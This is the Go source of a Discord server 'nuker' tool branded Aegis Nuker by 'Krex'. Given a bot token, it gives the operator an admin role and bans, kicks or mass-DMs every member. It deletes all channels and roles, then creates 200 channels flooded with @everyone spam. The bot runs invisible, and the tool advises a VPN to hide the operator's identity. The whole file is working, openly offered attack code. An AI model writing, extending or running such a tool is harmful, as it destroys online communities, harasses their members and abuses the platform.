package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var (
	colorReset   = "\033[0m"
	colorRed     = "\033[31m"
	colorGreen   = "\033[32m"
	colorYellow  = "\033[33m"
	colorBlue    = "\033[34m"
	colorPurple  = "\033[35m"
	colorCyan    = "\033[36m"
	colorWhite   = "\033[37m"
	colorMagenta = "\033[35m"
)

func printColored(text string, colorCode string) {
	fmt.Print(colorCode + text + colorReset)
}

func printColoredLine(text string, colorCode string) {
	fmt.Println(colorCode + text + colorReset)
}

const (
	banner = `

	█████╗ ███████╗ ██████╗ ██╗███████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
	██╔══██╗██╔════╝██╔════╝ ██║██╔════╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
	███████║█████╗  ██║  ███╗██║███████╗    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
	██╔══██║██╔══╝  ██║   ██║██║╚════██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
	██║  ██║███████╗╚██████╔╝██║███████║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
	╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
	
                                                          Made by Krex | V 1.20
`
)

var spamMessages = []string{
	"# @everyone @here gg krex was here discord.gg/brazilia",
	"# @everyone @here krexontop discord.gg/brazilia",
	"# @everyone @here krex runs discord discord.gg/brazilia",
	"# @everyone @here krex was here 💀 discord.gg/brazilia",
}

var channelPrefixes = []string{
	"krex-",
	"krexontop-",
	"hacked-by-krex-",
	"nuked-by-",
	"destroyed-",
}

var (
	unicodeRanges = [][]int{
		{0x0600, 0x06FF},
		{0x0900, 0x097F},
		{0x3000, 0x303F},
		{0x3040, 0x309F},
		{0x30A0, 0x30FF},
		{0x0370, 0x03FF},
		{0x0400, 0x04FF},
		{0x0E00, 0x0E7F},
		{0x1100, 0x11FF},
		{0x0590, 0x05FF},
		{0x1E00, 0x1EFF},
		{0x2000, 0x206F},
		{0x2070, 0x209F},
		{0x20A0, 0x20CF},
		{0x2100, 0x214F},
		{0x2190, 0x21FF},
		{0x2200, 0x22FF},
		{0x2300, 0x23FF},
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	fmt.Print("\033[H\033[2J")
	fmt.Print("\033[H\033[2J")

	printColoredLine(banner, colorRed)
	fmt.Println()

	printColoredLine("⚠️ CAUTION: Use a VPN to avoid Discord rate limits! ⚠️", colorRed)
	printColoredLine("   Discord may block your IP if you send too many requests.", colorYellow)
	printColoredLine("   A VPN will help protect your identity and avoid rate limits.", colorYellow)
	fmt.Println()

	printColoredLine("[*] Select an option:", colorCyan)
	printColoredLine("[1] Use Bot Token to Nuke (Auto-detect when added)", colorGreen)
	printColoredLine("[2] Use Bot Token to Nuke Specific Server", colorGreen)
	fmt.Println()

	printColored("[>] Your choice: ", colorYellow)
	reader := bufio.NewReader(os.Stdin)
	option, _ := reader.ReadString('\n')
	option = strings.TrimSpace(option)

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	switch option {
	case "1":
		nukeWithToken()
	case "2":
		nukeSpecificServer()
	default:
		printColoredLine("[!] Invalid option", colorRed)
		return
	}
}

func nukeWithToken() {
	printColored("[*] Enter Discord Bot Token: ", colorCyan)
	reader := bufio.NewReader(os.Stdin)
	token, _ := reader.ReadString('\n')
	token = strings.TrimSpace(token)

	printColored("[*] Enter Your User ID (to get admin): ", colorCyan)
	userID, _ := reader.ReadString('\n')
	userID = strings.TrimSpace(userID)

	fmt.Println()
	printColoredLine("[*] Configure nuke options before connecting:", colorCyan)
	options := configureNukeOptions()

	printColoredLine("[*] Connecting to Discord...", colorCyan)

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		printColoredLine("[!] Error creating Discord session: "+err.Error(), colorRed)
		return
	}

	app, err := dg.Application("@me")
	if err != nil {
		printColoredLine("[!] Error getting application info: "+err.Error(), colorRed)
		return
	}

	inviteLink := fmt.Sprintf("https://discord.com/oauth2/authorize?client_id=%s&scope=bot&permissions=8", app.ID)
	fmt.Println()
	printColoredLine("▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄", colorPurple)
	printColoredLine("[*] Bot invite link:", colorGreen)
	printColoredLine("[*] "+inviteLink, colorYellow)
	printColoredLine("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀", colorPurple)
	fmt.Println()
	printColoredLine("[*] Waiting for the bot to be added to a server...", colorCyan)

	dg.AddHandler(func(s *discordgo.Session, gc *discordgo.GuildCreate) {
		printColoredLine("[+] Bot added to new server: "+gc.Name+" (ID: "+gc.ID+")", colorGreen)
		printColoredLine("[*] Starting nuking process for: "+gc.Name, colorCyan)

		nukeServerWithOptions(dg, gc.ID, userID, options)
		printColoredLine("[+] Server "+gc.Name+" has been nuked!", colorGreen)
	})

	dg.AddHandler(func(s *discordgo.Session, ready *discordgo.Ready) {
		printColoredLine(fmt.Sprintf("[+] Bot is ready! Connected to %d servers", len(ready.Guilds)), colorGreen)
	})

	// Set bot status to invisible/offline before opening connection
	dg.UpdateGameStatus(0, "")
	dg.UpdateStatusComplex(discordgo.UpdateStatusData{
		Status: "invisible",
	})

	err = dg.Open()
	if err != nil {
		printColoredLine("[!] Error opening connection: "+err.Error(), colorRed)
		return
	}

	// Ensure bot stays offline after connection
	dg.UpdateStatusComplex(discordgo.UpdateStatusData{
		Status: "invisible",
	})

	printColoredLine("[*] Press ENTER to exit", colorCyan)
	reader.ReadString('\n')
	dg.Close()
}

func nukeSpecificServer() {
	printColored("[*] Enter Discord Bot Token: ", colorCyan)
	reader := bufio.NewReader(os.Stdin)
	token, _ := reader.ReadString('\n')
	token = strings.TrimSpace(token)

	printColored("[*] Enter Your User ID (to get admin): ", colorCyan)
	userID, _ := reader.ReadString('\n')
	userID = strings.TrimSpace(userID)

	fmt.Println()
	printColoredLine("[*] Configure nuke options before connecting:", colorCyan)
	options := configureNukeOptions()

	printColoredLine("[*] Connecting to Discord...", colorCyan)

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		printColoredLine("[!] Error creating Discord session: "+err.Error(), colorRed)
		return
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		printColoredLine("\n[*] Shutting down gracefully...", colorYellow)
		if dg != nil {
			if dg.State != nil && len(dg.State.Guilds) > 0 {
				for _, guild := range dg.State.Guilds {
					dg.GuildLeave(guild.ID)
				}
			}
			dg.Close()
		}
		os.Exit(0)
	}()

	dg.AddHandler(func(s *discordgo.Session, ready *discordgo.Ready) {
		if len(ready.Guilds) == 0 {
			printColoredLine("[!] Bot is not connected to any servers!", colorRed)
			printColoredLine("[*] Please add the bot to a server first.", colorYellow)
			return
		}

		fmt.Println()
		printColoredLine("[*] Available servers:", colorCyan)
		fmt.Println()

		for i, guild := range ready.Guilds {
			guildInfo, err := s.Guild(guild.ID)
			if err != nil {
				printColoredLine(fmt.Sprintf("[%d] Unknown Server (ID: %s)", i+1, guild.ID), colorYellow)
			} else {
				printColoredLine(fmt.Sprintf("[%d] %s (ID: %s)", i+1, guildInfo.Name, guild.ID), colorYellow)
			}
		}

		fmt.Println()
		printColored("[>] Enter the number of the server to nuke: ", colorCyan)

		inputReader := bufio.NewReader(os.Stdin)
		numStr, err := inputReader.ReadString('\n')
		if err != nil {
			printColoredLine("[!] Error reading input: "+err.Error(), colorRed)
			return
		}

		numStr = strings.TrimSpace(numStr)
		if numStr == "" {
			printColoredLine("[!] No input provided", colorRed)
			return
		}

		num := 0
		_, err = fmt.Sscanf(numStr, "%d", &num)
		if err != nil {
			printColoredLine("[!] Invalid number format", colorRed)
			return
		}

		if num < 1 || num > len(ready.Guilds) {
			printColoredLine(fmt.Sprintf("[!] Invalid server number. Please enter a number between 1 and %d", len(ready.Guilds)), colorRed)
			return
		}

		selectedGuild := ready.Guilds[num-1]
		guildID := selectedGuild.ID

		guildInfo, err := s.Guild(guildID)
		guildName := "Unknown Server"
		if err == nil {
			guildName = guildInfo.Name
		}

		printColoredLine(fmt.Sprintf("[*] Nuking server: %s", guildName), colorCyan)

		nukeServerWithOptions(dg, guildID, userID, options)
		printColoredLine("[+] Server has been nuked!", colorGreen)

		printColoredLine("[*] Nuke completed. Press CTRL+C to exit.", colorYellow)
		select {}
	})

	dg.UpdateGameStatus(0, "")
	dg.UpdateStatusComplex(discordgo.UpdateStatusData{
		Status: "invisible",
	})

	err = dg.Open()
	if err != nil {
		printColoredLine("[!] Error opening connection: "+err.Error(), colorRed)
		return
	}

	dg.UpdateStatusComplex(discordgo.UpdateStatusData{
		Status: "invisible",
	})

	select {}
}

func nukeServerWithOptions(s *discordgo.Session, guildID, userID string, options NukeOptions) {

	go giveAdminToUser(s, guildID, userID)

	if options.BanAll {
		go BanAllMembers(s, guildID, options)
	} else if options.KickAll {
		go KickAllMembers(s, guildID, options)
	} else if options.DmAll {
		go DmAllMembers(s, guildID, options.DmMsg)
	}

	go deleteAllChannels(s, guildID)

	go deleteAllRoles(s, guildID)

	createSpamChannels(s, guildID)
}

func configureNukeOptions() NukeOptions {
	options := DefaultNukeOptions

	printColoredLine("[*] Additional options:", colorCyan)

	printColored("[?] Ban all members? (y/n): ", colorYellow)
	reader := bufio.NewReader(os.Stdin)
	ban, _ := reader.ReadString('\n')
	options.BanAll = strings.TrimSpace(strings.ToLower(ban)) == "y"

	if !options.BanAll {
		printColored("[?] Kick all members? (y/n): ", colorYellow)
		kick, _ := reader.ReadString('\n')
		options.KickAll = strings.TrimSpace(strings.ToLower(kick)) == "y"
	}

	printColored("[?] DM all members before ban/kick? (y/n): ", colorYellow)
	dm, _ := reader.ReadString('\n')
	options.DmAll = strings.TrimSpace(strings.ToLower(dm)) == "y"

	if options.DmAll {
		printColoredLine("[*] Current DM message: "+options.DmMsg, colorCyan)
		printColored("[?] Enter custom DM message (leave blank to use default): ", colorYellow)
		msg, _ := reader.ReadString('\n')
		msg = strings.TrimSpace(msg)
		if msg != "" {
			options.DmMsg = msg
		}
	}

	fmt.Println()
	printColoredLine("[*] Nuke configuration:", colorCyan)
	if options.BanAll {
		printColoredLine("  - Will ban all members", colorGreen)
	} else if options.KickAll {
		printColoredLine("  - Will kick all members", colorGreen)
	}
	if options.DmAll {
		printColoredLine("  - Will DM all members with: "+options.DmMsg, colorGreen)
	}
	fmt.Println()

	return options
}

func giveAdminToUser(s *discordgo.Session, guildID, userID string) {
	if userID == "" {
		return
	}

	printColoredLine("[*] Attempting to give admin permissions to user: "+userID, colorCyan)

	roleParams := &discordgo.RoleParams{
		Name:        "ADMIN",
		Color:       func(v int) *int { return &v }(0xFF0000),
		Hoist:       func(v bool) *bool { return &v }(true),
		Permissions: func(v int64) *int64 { return &v }(int64(discordgo.PermissionAll)),
		Mentionable: func(v bool) *bool { return &v }(true),
	}

	adminRole, err := s.GuildRoleCreate(guildID, roleParams)
	if err != nil {
		printColoredLine("[!] Error creating admin role: "+err.Error(), colorRed)
		return
	}

	err = s.GuildMemberRoleAdd(guildID, userID, adminRole.ID)
	if err != nil {
		printColoredLine("[!] Error assigning admin role to user: "+err.Error(), colorRed)
		return
	}

	printColoredLine("[+] Admin permissions given to user: "+userID, colorGreen)
}

func deleteAllChannels(s *discordgo.Session, guildID string) {
	channels, err := s.GuildChannels(guildID)
	if err != nil {
		printColoredLine("[!] Error getting channels: "+err.Error(), colorRed)
		return
	}

	printColoredLine(fmt.Sprintf("[*] Deleting %d channels...", len(channels)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(channels))

	for _, channel := range channels {
		go func(channelID, channelName string) {
			defer wg.Done()
			_, err := s.ChannelDelete(channelID)
			if err != nil {
				printColoredLine("[!] Error deleting channel: "+err.Error(), colorRed)
			} else {
				printColoredLine("[+] Deleted channel: "+channelName, colorGreen)
			}

		}(channel.ID, channel.Name)
	}

	wg.Wait()
}

func deleteAllRoles(s *discordgo.Session, guildID string) {
	roles, err := s.GuildRoles(guildID)
	if err != nil {
		printColoredLine("[!] Error getting roles: "+err.Error(), colorRed)
		return
	}

	var deleteableRoles []*discordgo.Role
	for _, role := range roles {
		if role.Name != "@everyone" {
			deleteableRoles = append(deleteableRoles, role)
		}
	}

	printColoredLine(fmt.Sprintf("[*] Deleting %d roles...", len(deleteableRoles)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(deleteableRoles))

	for _, role := range deleteableRoles {
		go func(roleID, roleName string) {
			defer wg.Done()
			err := s.GuildRoleDelete(guildID, roleID)
			if err != nil {
				printColoredLine("[!] Error deleting role: "+err.Error(), colorRed)
			} else {
				printColoredLine("[+] Deleted role: "+roleName, colorGreen)
			}

		}(role.ID, role.Name)
	}

	wg.Wait()
}

func createSpamChannels(s *discordgo.Session, guildID string) {
	numChannels := 200 // Increased number
	printColoredLine(fmt.Sprintf("[*] Creating %d spam channels with instant spam...", numChannels), colorCyan)

	// Create channels as fast as possible without waiting
	for i := 0; i < numChannels; i++ {
		go func() {
			channelName := generateRandomChannelName()
			channel, err := s.GuildChannelCreate(guildID, channelName, discordgo.ChannelTypeGuildText)
			if err != nil {
				return // Don't log errors to keep it fast
			}

			printColoredLine("[+] Created channel: "+channelName, colorGreen)

			// Start spamming immediately with bot messages (faster than webhooks)
			go fastSpamChannel(s, channel.ID, channelName)
		}()
	}

	printColoredLine("[+] All channels creation started!", colorGreen)
}

// fastSpamChannel spams a channel with bot messages as fast as possible
func fastSpamChannel(s *discordgo.Session, channelID, channelName string) {
	const totalMessages = 2000 // Messages per channel
	const concurrent = 50      // Concurrent message senders

	var wg sync.WaitGroup
	wg.Add(concurrent)

	messagesPerSender := totalMessages / concurrent

	for i := 0; i < concurrent; i++ {
		go func() {
			defer wg.Done()

			for j := 0; j < messagesPerSender; j++ {
				message := getRandomSpamMessage()
				s.ChannelMessageSend(channelID, message)
				// No delays - send as fast as possible
			}
		}()
	}

	// Don't wait for completion
	go func() {
		wg.Wait()
		printColoredLine("[+] Finished spamming channel: "+channelName, colorGreen)
	}()
}

func getRandomSpamMessage() string {
	return spamMessages[rand.Intn(len(spamMessages))]
}

func generateRandomChannelName() string {

	prefix := channelPrefixes[rand.Intn(len(channelPrefixes))]

	unicodePart := generateRandomUnicode(5 + rand.Intn(5))

	return prefix + unicodePart
}

func generateRandomUnicode(length int) string {
	result := ""

	for i := 0; i < length; i++ {

		rangeIdx := rand.Intn(len(unicodeRanges))
		selectedRange := unicodeRanges[rangeIdx]

		charCode := rand.Intn(selectedRange[1]-selectedRange[0]) + selectedRange[0]
		result += string(rune(charCode))
	}

	return result
}
